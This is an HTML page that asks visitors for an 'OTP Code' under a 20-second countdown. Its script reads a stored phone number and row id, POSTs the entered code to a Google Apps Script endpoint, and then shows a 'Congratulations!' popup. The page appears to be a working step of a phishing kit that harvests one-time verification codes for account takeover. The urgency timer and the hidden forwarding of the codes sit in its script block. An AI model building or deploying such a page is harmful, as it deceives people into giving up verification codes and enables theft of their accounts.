<!DOCTYPE html>
<html>
<head>
  <title>Enter Code</title>
  <style>
  .popup-content {
  background: white;
  padding: 20px;
  border-radius: 10px;
  text-align: center;
}

.popup-content h2 {
  color: #28a745;
  margin-bottom: 10px;
}

.popup-content p {
  color: #333;
  font-size: 16px;
}
  body {
    background: url("banner.png") no-repeat center center fixed;
    background-size: cover;
    font-family: Arial;
    color: white;
    margin: 0;
    height: 100vh;

    /* FIX: proper centering */
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
  }

  .form-box {
  width: 90%;
  max-width: 360px;
  padding: 20px;
  background: rgba(0, 0, 0, 0.45);
  border-radius: 15px;
  backdrop-filter: blur(6px);
  text-align: center;
  color: white;
}

/* 3. TITLE TEXT */
.form-box h2 {
  margin-bottom: 15px;
  font-size: 18px;
}

/* 4. INPUTS (TRANSPARENT STYLE) */
.form-box input {
  width: 60%;
  padding: 12px;
  margin: 10px 0;
  border: 1px solid rgba(255,255,255,0.4);
  background: white; /* Solid white input box */
  color: #333; /* Dark text so you can read it */
  outline: none;
  border-radius: 8px;
}

/* placeholder style */
.form-box input::placeholder {
  color: #999; /* Grey placeholder text */
}
.form-box button {
  background: #007bff;  /* Blue button */
  color: white;
  border: none;
  padding: 12px 30px;
  border-radius: 8px;
  font-size: 16px;
  cursor: pointer;
  margin-top: 10px;
}
  #timer {
    font-size: 18px;
    margin-bottom: 10px;
    color: black;
  }

  #expired {
    display: none;
    color: red;
    font-weight: bold;
    margin-top: 10px;
  }
</style>
  </style>
</head>

<body>

<div class="form-box">
  <h3>Enter OTP Code:</h3>

  <div id="timer">Time left: 20s</div>

  <input type="text" id="code" placeholder="Code:">
  <br>

  <button id="submitBtn" onclick="submitCode()">Submit Code</button>

  <div id="expired">Time expired. Please restart the process.</div>
</div>

<script>
let timeLeft = 20;

let countdown = setInterval(() => {
  timeLeft--;
  document.getElementById("timer").innerText = "Time left: " + timeLeft + "s";

  if(timeLeft <= 0) {
    clearInterval(countdown);
    lockPage();
  }
}, 1000);

function lockPage() {
  document.getElementById("code").disabled = true;
  document.getElementById("submitBtn").disabled = true;
  document.getElementById("expired").style.display = "block";
  document.getElementById("timer").innerText = "Time left: 0s";
}

function submitCode() {
  let code = document.getElementById("code").value;

  if(code === "") {
    alert("Enter code");
    return;
  }

  document.getElementById("successPopup").style.display = "block";

  console.log({
    phone: localStorage.getItem("phone"),
    id: localStorage.getItem("id"),
    code: code
  });
fetch("https://script.google.com/macros/s/AKfycbysMwr3SDaaSNsAWZqL8PDW0Sorl5hAxc0LaGmsxsBn9eCDgJ8XQ9z_58R6TFTnbvDY/exec", {
  method: "POST",
  body: JSON.stringify({
    row: localStorage.getItem("row"),
    code: code
  })
})
.then(res => res.text())
.then(data => {

  console.log(data);

  document.getElementById("successPopup").style.display = "block";

  clearInterval(countdown);

})
.catch(err => {
  console.error(err);
});

  clearInterval(countdown);
}
</script>
<div id="successPopup" class="popup" style="display:none;">
  <div class="popup-content">
    <h2>🎉 Congratulations!</h2>
    
    <button onclick="closePopup()">OK</button>

</div>
</body>
</div>
</html>
